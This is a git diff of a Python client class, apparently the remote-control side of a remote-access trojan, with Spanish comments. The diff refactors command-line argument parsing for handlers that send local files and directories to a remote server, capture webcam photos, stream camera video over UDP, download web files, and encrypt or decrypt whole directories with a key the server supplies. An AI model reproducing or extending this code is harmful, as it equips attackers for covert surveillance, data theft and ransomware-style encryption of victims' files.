@@ -53,6 +53,31 @@ class TCP:
                 # Si no se consigue una conexion, se espera 5 segundos
                 sleep(5)
 
+    def parametros(self, cmd, arg1, arg2=None):
+        flags = None
+        if arg2 is not None and re.search(arg2, cmd):
+            m = re.search(arg2, cmd)
+            if m.end() == len(cmd):
+                flags = cmd[m.start()+1:m.end()]
+                cmd = re.sub(arg2[:-3], '', cmd)
+            else:
+                flags = cmd[m.start()+1:m.end()-1]
+                cmd = re.sub(arg2, ' ', cmd)
+
+        m = re.split(arg1, cmd)
+        m.pop(0)
+            
+        params = {}
+
+        i = 0
+        while i < len(m):
+            flag = m[i].replace(' ', '')
+            flag = flag.replace('=', '')
+            params[flag] = m[i+1]
+            i += 2
+
+        return params, flags
+
     # Funcion para regresar el nombre de un archivo o directorio
     # ubicacion --> ubicacion del archivo o directorio
     def getNombre(self, ubicacion):
@@ -226,8 +251,9 @@ class TCP:
     # Funcion para enviar un archivo al servidor
     # cmd --> comando recibido
     def sendFileFrom(self, cmd):
-        if re.search("-d[= ]", cmd):
-            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]
+        if re.search(r"\s-o[= ]", cmd):
+            params = self.parametros(cmd, r"(\s-[io]+[= ])")[0]
+            origen = params['-i']
 
             if os.path.isfile(origen):
                 self.__sock.send("ok".encode())
@@ -238,7 +264,8 @@ class TCP:
                 self.__sock.send(f"error: Archivo \"{origen}\" no encontrado".encode())
 
         else:
-            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
+            params = self.parametros(cmd, r"(\s-[io]+[= ])")[0]
+            origen = params['-i']
 
             if os.path.isfile(origen):
                 self.__sock.send("ok".encode())
@@ -256,8 +283,9 @@ class TCP:
     # Funcion para recibir un archivo del servidor
     # cmd --> comando recibido
     def sendFileTo(self, cmd):
-        if re.search("-d[= ]", cmd):
-            destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
+        if re.search(r"\s-o[= ]", cmd):
+            params = self.parametros(cmd, r"(\s-[io]+[= ])")[0]
+            destino = params['-o']
 
             self.__sock.send("ok".encode())
             self.recibirArchivo(destino)
@@ -272,7 +300,7 @@ class TCP:
     # Funcion para enviar una imagen al servidor
     # cmd --> comando recibido
     def image(self, cmd):
-        if re.search("-r[= ]", cmd):
+        if re.search(r"\s-r\s?", cmd):
             imagenes = []
             for i in os.listdir(os.getcwd()):
                 archivo = f"{os.getcwd()}/{i}"
@@ -283,10 +311,8 @@ class TCP:
             imagen = imagenes[num]
 
         else:
-            if re.search("-t[= ]", cmd):
-                imagen = re.findall("-i[= ]([a-zA-Z0-9./ ].*) -t", cmd)[0]
-            else:
-                imagen = re.findall("-i[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
+            params = self.parametros(cmd, r"(\s-[it]+[= ])", r"\s-[xygnmc012789]+\s?")[0]
+            imagen = params['-i']
 
         if os.path.isfile(imagen) and self.isImage(imagen):
             self.__sock.send("ok".encode())
@@ -307,7 +333,11 @@ class TCP:
     # Funcion para tomar una foto y enviarla al servidor
     # cmd --> comando recibido
     def pic(self, cmd):
-        camara = int(re.findall("-c[= ]([0-9].*)", cmd)[0])
+        params = self.parametros(cmd, r"(\s-c[= ])", r"\s-s\s?")[0]
+        try:
+            camara = int(params['-c'])
+        except:
+            camara = 0
         captura = cv2.VideoCapture(camara, cv2.CAP_DSHOW)
 
         leido, frame = captura.read()
@@ -326,7 +356,11 @@ class TCP:
     # Funcion para enviar video de la camara al servidor
     # cmd --> comando recibido
     def captura(self, cmd):
-        camara = int(re.findall("-c[= ]([0-9. ].*)", cmd)[0])
+        params = self.parametros(cmd, r"(\s-c[= ])", r"\s-s\s?")[0]
+        try:
+            camara = int(params['-c'])
+        except:
+            camara = 0
         udp = UDP(self.__host, self.__port)
 
         captura = cv2.VideoCapture(camara, cv2.CAP_DSHOW)
@@ -352,11 +386,16 @@ class TCP:
     # Funcion para enviar un directorio al servidor
     # cmd --> comando recibido
     def sendDirFrom(self, cmd):
-        if re.search("-d[= ]", cmd):
-            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]
-            if re.search("-i[= ]", cmd):
-                index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
-                if index <= 0:
+        if re.search(r"\s-o[= ]", cmd):
+            params = self.parametros(cmd, r"(\s-[iop]+[= ])", r"\s-a\s?")[0]
+            origen = params['-i']
+
+            if '-p' in params.keys():
+                try:
+                    index = int(params['-p'])
+                    if index <= 0:
+                        index = 1
+                except:
                     index = 1
             else:
                 index = 1
@@ -370,13 +409,17 @@ class TCP:
                 self.__sock.send(f"error: Directorio \"{origen}\" no encontrado".encode())
 
         else:
-            if re.search("-i[= ]", cmd):
-                origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -i", cmd)[0]
-                index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
-                if index <= 0:
+            params = self.parametros(cmd, r"(\s-[iop]+[= ])", r"\s-a\s?")[0]
+            origen = params['-i']
+
+            if '-p' in params.keys():
+                try:
+                    index = int(params['-p'])
+                    if index <= 0:
+                        index = 1
+                except:
                     index = 1
             else:
-                origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
                 index = 1
 
             if os.path.isdir(origen):
@@ -393,23 +436,32 @@ class TCP:
     # Funcion para recibir un directorio del servidor
     # cmd --> comando recibido
     def sendDirTo(self, cmd):
-        if re.search("-d[= ]", cmd):
-            if re.search("-i[= ]", cmd):
-                destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*) -i", cmd)[0]
-                index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
-                if index <= 0:
+        if re.search(r"\s-o[= ]", cmd):
+            params = self.parametros(cmd, r"(\s-[iop]+[= ])", r"\s-a\s?")[0]
+            destino = params['-o']
+
+            if '-p' in params.keys():
+                try:
+                    index = int(params['-p'])
+                    if index <= 0:
+                        index = 1
+                except:
                     index = 1
             else:
-                destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
                 index = 1
 
             self.__sock.send("ok".encode())
             self.recibirDirectorio(destino, index)
 
         else:
-            if re.search("-i[= ]", cmd):
-                index = int(re.findall("-i[= ]([0-9. ].*)", cmd)[0])
-                if index <= 0:
+            params = self.parametros(cmd, r"(\s-[iop]+[= ])", r"\s-a\s?")[0]
+
+            if '-p' in params.keys():
+                try:
+                    index = int(params['-p'])
+                    if index <= 0:
+                        index = 1
+                except:
                     index = 1
             else:
                 index = 1
@@ -423,24 +475,26 @@ class TCP:
     # Funcion para comprimir un directorio
     # cmd --> comando recibido
     def comprimir(self, cmd):
-        if re.search("-d[= ]", cmd):
-            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]
-            destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
+        params = self.parametros(cmd, r"(\s-[io]+[= ])")[0]
+        origen = params['-i']
+
+        if '-o' in params.keys():
+            destino = params['-o']
         else:
-            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
+            destino = 'output'
 
         if os.path.isfile(origen):
-            if not re.search("-d[= ]", cmd):
-                destino = f"{self.getNombre(origen)}.zip"
-
             nombre = self.getNombre(origen)
+            if not re.search(r"\s-o[= ]", cmd):
+                destino = f"{nombre}.zip"
+
             with ZipFile(destino, 'w') as zip:
                 zip.write(origen, nombre)
             zip.close()
             info = f"Archivo \"{nombre}\" comprimido"
 
         elif re.search('/', origen) and not os.path.isdir(origen):
-            if re.search("-d[= ]", cmd):
+            if re.search(r"\s-o[= ]", cmd):
                 archivos = origen.split('/')
                 directorio = os.getcwd()
                 info = '\n'
@@ -450,13 +504,14 @@ class TCP:
                         if os.path.isfile(archivo):
                             nombre = self.getNombre(archivo)
                             zip.write(archivo, nombre)
-                            info += f"Archivo \"{i}\" comprimido\n"
+                            info += f"[+] Archivo \"{i}\" comprimido\n"
                 zip.close()
             else:
-                info = "error: Falta del parametro de destino (-d)"
+                info = "error: Falta del parametro de destino (-o)"
 
         elif os.path.isdir(origen):
-            destino = f"{self.getNombre(origen)}.zip"
+            if not re.search(r"\s-o[= ]", cmd):
+                destino = f"{self.getNombre(origen)}.zip"
 
             archivos = []
             for i in os.listdir(origen):
@@ -482,11 +537,12 @@ class TCP:
     # Funcion para descomprimir un archivo '.zip'
     # cmd --> comando recibido
     def descomprimir(self, cmd):
-        if re.search("-d[= ]", cmd):
-            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]
-            destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
+        params = self.parametros(cmd, r"(\s-[io]+[= ])")[0]
+        origen = params['-i']
+
+        if '-o' in params.keys():
+            destino = params['-o']
         else:
-            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
             destino = self.getNombre(origen).replace(".zip", '')
 
         if os.path.isfile(origen) and origen.endswith(".zip"):
@@ -509,7 +565,8 @@ class TCP:
     def encrypt(self, cmd):
         self.__sock.send("ok".encode())
         key = self.__sock.recv(1024)
-        directorio = re.findall("-e[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
+        params = self.parametros(cmd, r"(\s-[ek]+[= ])")[0]
+        directorio = params['-e']
 
         if os.path.isdir(directorio):
             nombre = self.getNombre(directorio)
@@ -563,7 +620,8 @@ class TCP:
     def decrypt(self, cmd):
         self.__sock.send("ok".encode())
         key = self.__sock.recv(1024)
-        directorio = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
+        params = self.parametros(cmd, r"(\s-[dk]+[= ])")[0]
+        directorio = params['-d']
 
         if os.path.isdir(directorio):
             nombre = self.getNombre(directorio)
@@ -616,16 +674,16 @@ class TCP:
     # Funcion para descargar archivos web
     # cmd --> comando recibido
     def wget(self, cmd):
+        params = self.parametros(cmd, r"(\s-[nu]+[= ])")[0]
+        url = params['-u']
         extensiones = ["jpg", "png", "jpeg", "webp", "svg", "mp4", "avi", "mkv", "mp3", "txt", "dat",
             "html", "css", "js", "py", "c", "cpp", "java", "go", "rb", "php", "ino", "tex", "m", "pdf"]
         extensionesUpper = [i.upper() for i in extensiones]
 
-        if re.search("-n[= ]", cmd):
-            url = re.findall("-u[= ]([a-zA-Z0-9./ ].*) -n", cmd)[0]
-            nombre = re.findall("-n[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
+        if re.search(r"\s-n[= ]", cmd):
+            nombre = params['-n']
             valido = True
         else:
-            url = re.findall("-u[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
             valido = False
             i = 0
             while i < len(extensiones):
@@ -640,7 +698,7 @@ class TCP:
                 i += 1
 
             if valido:
-                nombre = re.findall(f"/([a-zA-Z0-9_ ].+[.]{ext})", url)[0]
+                nombre = re.findall(f"/([\W\w]+[.]{ext})", url)[0]
                 nombre = nombre.split('/')[-1]
 
         if valido:
